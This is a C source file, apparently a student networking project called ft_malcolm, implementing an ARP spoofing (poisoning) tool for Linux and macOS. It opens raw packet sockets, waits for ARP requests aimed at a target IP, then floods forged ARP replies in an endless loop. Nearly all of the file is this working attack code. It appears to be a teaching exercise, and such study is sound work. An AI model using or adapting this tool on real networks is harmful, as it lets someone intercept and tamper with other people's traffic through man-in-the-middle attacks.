# include "ft_malcolm.h"


# ifdef OSX
int	spoofArp(ft_malcolm *malc)
{
	size_t					packageSize = sizeof(struct ether_header) + sizeof(struct ether_arp);
	struct ether_header		*ethhdr = NULL;
	struct ether_arp		*arphdr = NULL;
	struct ether_addr		localMac;
	struct sockaddr			sIpSrc;
	struct sockaddr			sIpTarget;

	if (!(malc->msg = malloc(packageSize)))
	{
		dprintf(STDERR_FILENO, "Malloc msg failed: %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	ethhdr = (struct ether_header *)malc->msg;
	arphdr = (struct ether_arp *)(ethhdr + 1);

	if (getMacAddress(&localMac, malc->opt.ifName))
		return EXIT_FAILURE;

    dprintf(STDOUT_FILENO, "interface: `%s` has MAC address equal to: %02x:%02x:%02x:%02x:%02x:%02x\n", 			malc->opt.ifName,
		localMac.octet[0], localMac.octet[1],
		localMac.octet[2], localMac.octet[3],
		localMac.octet[4], localMac.octet[5]);

	/* fill ethernet header */
	fillEtherPacket(ethhdr, &localMac, &malc->srcMac, ETHERTYPE_ARP);
	/* fill arp header */
	fillArpPacket(arphdr, &malc->srcMac, &malc->targetMac, malc->srcIp, malc->targetIp, ARPOP_REPLY);

	/* Send package */
	char macBuf1[INET_ADDRSTRLEN];
	char macBuf2[INET_ADDRSTRLEN];
	char ipBuf1[ETHER_ADDRSTRLEN];
	char ipBuf2[ETHER_ADDRSTRLEN];
	ssize_t ret = 0;
	ipToSockaddr(malc->srcIp, &sIpSrc);
	ipToSockaddr(malc->targetIp, &sIpTarget);
	dprintf(STDOUT_FILENO, "Sending reply to: %s at %s telling that %s is at %s\n",
		ipToStr(&sIpSrc, macBuf1, INET_ADDRSTRLEN),
		macToStr(&malc->srcMac, ipBuf1),
		ipToStr(&sIpTarget, macBuf2, INET_ADDRSTRLEN),
		macToStr(&malc->targetMac, ipBuf2));
	dprintf(STDOUT_FILENO, "Sending frame with a size of: %lu \n", packageSize);
	ret = write(malc->socket, malc->msg, packageSize);
	dprintf(STDOUT_FILENO, "Size sended: %ld\n", ret);

	return EXIT_SUCCESS;
}
# endif//OSX 

#ifdef LINUX

int	spoofArpLinux(ft_malcolm *malc)
{
	size_t				packageSize = sizeof(struct ether_header) + sizeof(struct ether_arp);
	struct ethhdr		*ethhdr = NULL;
	arp_t				*arphdr = NULL;
	macAddr_t			localMac;
	struct sockaddr		sIpSrc;
	struct sockaddr		sIpTarget;

	if (!(malc->msg = malloc(packageSize)))
	{
		dprintf(STDERR_FILENO, "Malloc msg failed: %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	ethhdr = (struct ethhdr *)malc->msg;
	arphdr = (arp_t *)(ethhdr + 1);

	if (getIfMacAddress(malc, &localMac))
		return EXIT_FAILURE;

    dprintf(STDOUT_FILENO, "interface: `%s` has MAC address equal to: %02x:%02x:%02x:%02x:%02x:%02x\n",
		malc->ifName,
		localMac.octet[0], localMac.octet[1],
		localMac.octet[2], localMac.octet[3],
		localMac.octet[4], localMac.octet[5]);

	/* fill ethernet header */
	fillEtherPacket(ethhdr, &localMac, &malc->srcMac, ETHERTYPE_ARP);
	/* fill arp header */
	fillArpPacket(arphdr, &malc->srcMac, &malc->targetMac, malc->srcIp, malc->targetIp, ARPOP_REPLY);

	/* Send package */
	char macBuf1[INET_ADDRSTRLEN];
	char macBuf2[INET_ADDRSTRLEN];
	char ipBuf1[ETHER_ADDRSTRLEN];
	char ipBuf2[ETHER_ADDRSTRLEN];
	ssize_t ret = 0;
	ipToSockaddr(malc->srcIp, &sIpSrc);
	ipToSockaddr(malc->targetIp, &sIpTarget);
	dprintf(STDOUT_FILENO, "Sending reply to: %s at %s telling that %s is at %s\n",
		ipToStr(&sIpSrc, macBuf1, INET_ADDRSTRLEN),
		macToStr(&malc->srcMac, ipBuf1),
		ipToStr(&sIpTarget, macBuf2, INET_ADDRSTRLEN),
		macToStr(&malc->targetMac, ipBuf2));
	dprintf(STDOUT_FILENO, "Sending frame with a size of: %lu \n", packageSize);
	ret = sendto(malc->socket, malc->msg, packageSize, 0, NULL, 0);
	dprintf(STDOUT_FILENO, "Size sended: %ld\n", ret);

	return EXIT_SUCCESS;
}
#endif //LINUX
int		getInterfaces(ft_malcolm *malc, int all)
{
	char			buff[42];
	struct ifaddrs	*if_current;

	if (getifaddrs(&if_current))
	{
		dprintf(STDOUT_FILENO, "Fail to fetch interfaces because of : %s\n", strerror(errno));
		return EXIT_FAILURE;
	}

	dprintf(STDOUT_FILENO, "Interfaces found:\n");
	malc->all_ifs = if_current;
	while (if_current)
	{
		if (if_current->ifa_addr->sa_family == AF_INET)
		{
			dprintf(STDOUT_FILENO, "%10s - %s - %s\n", if_current->ifa_name, (if_current->ifa_addr->sa_family == AF_INET ? "IPv4" : "IPv6"), ipToStr(if_current->ifa_addr, buff, 41));
			if (!all && ft_strcmp(if_current->ifa_name, "lo0"))
				malc->used_ifs = if_current;
		}
		if_current=if_current->ifa_next;
	}
	dprintf(STDOUT_FILENO, "using [%s] %d\n", malc->used_ifs->ifa_name, IF_NAMESIZE);
	return EXIT_SUCCESS;
}


int init_connection(ft_malcolm * malc, char **av)
{
	ft_memset(&malc->conn, '\0', sizeof(struct sockaddr_in));

	/* Get interface name */
	if (getInterfaces(malc, 0))
		return EXIT_FAILURE;
	ft_strlcpy(malc->ifName, malc->used_ifs->ifa_name, IF_NAMESIZE);
	malc->ifIndex = if_nametoindex(malc->ifName);
	if (malc->ifIndex == 0)
	{
		dprintf(STDERR_FILENO, "Fail to get interface index cause: %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	else if (malc->verbose)
		dprintf(STDOUT_FILENO, "Interface index = %u\n", malc->ifIndex);
	/* Get IP of this interface */
	ft_memcpy(malc->ownIP, malc->used_ifs->ifa_addr->sa_data, IPV4_ADDR_LEN);
	
	/* extract MAC  target 1*/
	ft_capitalize(av[1]);
	strToMac(&malc->srcMac, av[1]);
	if (malc->verbose)
		printMac(&malc->srcMac, "target1 MAC address:");
	ft_capitalize(av[3]);

	/* extract MAC  target 2*/
	strToMac(&malc->targetMac, av[3]);
	if (malc->verbose)
		printMac(&malc->targetMac, "target2 MAC address:");

	struct hostent *hps = gethostbyname(av[0]);
	if (!hps)
	{
		dprintf(STDERR_FILENO, "Unable to resolve %s\n", av[0]);
		return EXIT_FAILURE;	
	}
	dprintf(STDOUT_FILENO, "Hostname: %s, was resolved to: %s\n",
           av[0],inet_ntoa(*(struct in_addr*)hps->h_addr_list[0]));
	ft_memcpy(malc->srcIp, hps->h_addr_list[0], IPV4_ADDR_LEN);



	struct hostent *hpt = gethostbyname(av[2]);
	if (!hpt)
	{
		dprintf(STDERR_FILENO, "Unable to resolve %s\n", av[2]);
		return EXIT_FAILURE;	
	}
	dprintf(STDOUT_FILENO, "Hostname: %s, was resolved to: %s\n",
		av[2],inet_ntoa(*(struct in_addr*)hpt->h_addr_list[0]));
	ft_memcpy(malc->targetIp, hpt->h_addr_list[0], IPV4_ADDR_LEN);


	/* Fill sockaddr(s) with ip */
	char buf[INET_ADDRSTRLEN];
	ipToSockaddr(malc->srcIp, &malc->sockSrcIp);
	ipToSockaddr(malc->targetIp, &malc->sockTargetIp);

	dprintf(STDOUT_FILENO, "source IP: %s\n", ipToStr(&malc->sockSrcIp, buf, INET_ADDRSTRLEN));
	dprintf(STDOUT_FILENO, "target IP: %s\n", ipToStr(&malc->sockTargetIp, buf, INET_ADDRSTRLEN));
	

	return EXIT_SUCCESS;
}


uint32_t	ft_malcolm_linux(ft_malcolm *malc)
{
	// int				enableBroadcast = 1;
	struct sockaddr_ll	si_interface;
	struct sockaddr		si_other;
	// struct sockaddr_ll	socket_address;
	dprintf(STDOUT_FILENO, "ftlinux\n");

	// Create a socket enabled for receiving ARP packets
	if ((malc->socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
	{
		dprintf(STDERR_FILENO, "Failed to initialize socket: %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	// if (setsockopt(malc->socket, SOL_SOCKET, SO_BROADCAST, &enableBroadcast, sizeof(enableBroadcast)))
	// {
	// 	dprintf(STDERR_FILENO, "Failed to set socket SO_BROADCAST option: %s\n", strerror(errno));
	// 	return EXIT_FAILURE;	
	// }
	bzero(&si_interface, sizeof(si_interface));
	si_interface.sll_family = AF_PACKET;
	si_interface.sll_ifindex = malc->ifIndex;

	dprintf(STDOUT_FILENO, "Binding socket to interface [%s]\n", malc->ifName);
	if (bind(malc->socket, (struct sockaddr *)&si_interface, sizeof(si_interface)) != 0)
	{
		dprintf(STDERR_FILENO, "Failed to bind socket to INADDR_ANY option because: %s\n", strerror(errno));
		return EXIT_FAILURE;	
	}
	// if (setsockopt(malc->socket, SOL_SOCKET, SO_BINDTODEVICE, &malc->ifName, sizeof(malc->ifName)))


	char	buf[10000];
	char	buf2[42];
	int		ret = 0;
	unsigned slen=sizeof(struct sockaddr);
	dprintf(STDOUT_FILENO, "wait incoming data\n");
	while(1)
	{
	    ret = recvfrom(malc->socket, buf, sizeof(buf)-1, 0, (struct sockaddr *)&si_other, &slen);
		if (ret < 0)
		{
			dprintf(STDERR_FILENO, "Recvfrom failed because of: %s\n", strerror(errno));
			return EXIT_FAILURE;
		}
		buf[ret] = '\0';
	    dprintf(STDOUT_FILENO, "recv: %d bytes from %s\n", ret, ipToStr(((struct sockaddr*)&si_other), buf2, 41));
		struct ethhdr	*recv_resp = (struct ethhdr *) buf;
		arp_t			*arp_resp = (arp_t *) (recv_resp + 1);
		
		dprintf(STDOUT_FILENO, "proto = %x, %x, %x\n", recv_resp->h_proto, ntohs(recv_resp->h_proto), ETH_P_ARP);
		if (ntohs(recv_resp->h_proto) != ETH_P_ARP )
		{
			dprintf(STDOUT_FILENO, "Not an ARP packet\n");
			continue ;
		}
		else if (ntohs(arp_resp->ea_hdr.ar_op) != ARPOP_REQUEST)
		{
			dprintf(STDOUT_FILENO, "Not a Request\n");
			continue ;
		}
		struct in_addr sender_a;
		memset(&sender_a, 0, sizeof(struct in_addr));
		memcpy(&sender_a.s_addr, arp_resp->arp_spa, sizeof(uint32_t));
		dprintf(STDOUT_FILENO, "IP sender  = %s\n", inet_ntoa(sender_a));
		dprintf(STDOUT_FILENO, "Mac sender = %02x:%02x:%02x:%02x:%02x:%02x\n",
				arp_resp->arp_sha[0], arp_resp->arp_sha[1],
				arp_resp->arp_sha[2], arp_resp->arp_sha[3],
				arp_resp->arp_sha[4], arp_resp->arp_sha[5]);
		if (*(uint32_t *)arp_resp->arp_tpa == ipToInt(&malc->sockTargetIp))
		{
			dprintf(STDOUT_FILENO, "Expected Target !!! Sending reply:\n");
			while (1)
			{
				spoofArpLinux(malc);
				usleep(200);
			}
		}
		//TODO know check for a request looking for target then make and send a reply to src
	}

	return EXIT_SUCCESS;
}
int	clean_quit(ft_malcolm *malc)
{
	dprintf(STDOUT_FILENO, "Cleaning program...\n");
	close(malc->socket);
	freeifaddrs(malc->all_ifs);
	return EXIT_SUCCESS;
}

# ifdef OSX

int waitArpRequestOsx(ft_malcolm *malc)
{
	if (openBpfFile(&malc->socket, STDOUT_FILENO, malc->verbose)
		|| bpfSetOption(malc)
		|| bpfCheckDlt(malc)
		|| bpfSetFilter(malc))
		return EXIT_FAILURE;
	if (read_packets(malc))
		return EXIT_FAILURE;
	dprintf(STDOUT_FILENO, "Now get ready to send an ARP reply\n");
	return EXIT_SUCCESS;
}
# endif //OSX


int parsing_arguments(int ac, char **av, ft_malcolm *malc)
{
	char buf[4096];
	if (ft_strlen(av[0]) > 4000)
		av[0][4000] = '\0';
	buf[sprintf(buf, "%s [options] [--] target1_ip target1_mac target2_ip target2_mac", av[0])] = '\0';
	const char *const usages[] = {
    	buf,
    	NULL,
	};
	struct argparse_option options[] = {
        OPT_HELP(),
        OPT_GROUP("Basic options"),
        OPT_BOOLEAN('v', "verbose", &malc->verbose, "enable verbose mode.", NULL, 0, 0),
        OPT_STRING('i', "interface", &malc->opt.ifName, "force to use a specific interface.", NULL, 0, 0),
		//add timeout SO_RCVTIMEO
        OPT_END(),
    };
	struct argparse argparse;
    argparse_init(&argparse, options, usages, 0);
    argparse_describe(&argparse, "\nARP spoofing (poisoning) program.", "\nAdditional description of the program after the description of the arguments.");
    ac = argparse_parse(&argparse, ac, (const char**)av);
	if (ac < 4)
	{
		argparse_usage(&argparse);
		return EXIT_FAILURE;
	}
	return EXIT_SUCCESS;
}

int main(int ac, char **av)
{
	ft_malcolm malc;

	if (parsing_arguments(ac, av, &malc))
		return EXIT_FAILURE;
	if (init_connection(&malc, av))
		return EXIT_FAILURE;
	dprintf(STDOUT_FILENO, "Verbose mode %s.\n", (malc.verbose) ? "enabled" : "disabled");
# ifdef LINUX
	if (ft_malcolm_linux(&malc))
		return EXIT_FAILURE;
# elif defined OSX
	while (1) {
		if (waitArpRequestOsx(&malc))
			return EXIT_FAILURE;

		/* Tell target that we are source */
			// spoofArp(&malc);
		close(malc.socket);
	}
# endif
	if (clean_quit(&malc))
		return EXIT_FAILURE;
	return EXIT_SUCCESS;
}